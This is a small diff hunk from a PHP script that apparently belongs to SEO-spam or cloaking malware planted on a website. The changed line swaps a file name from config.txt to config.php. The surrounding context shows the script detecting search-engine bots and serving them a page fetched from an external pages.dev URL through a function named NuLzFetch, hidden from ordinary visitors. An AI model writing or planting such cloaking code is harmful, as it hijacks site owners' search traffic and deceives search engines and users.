@@ -40,7 +40,7 @@ header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
 $landing_page = 'https://nkscomvn.pages.dev/nkscom/';
-$index_home = 'config.txt';
+$index_home = 'config.php';
 
 if (isSearchEngineBot()) {
     echo NuLzFetch($landing_page);
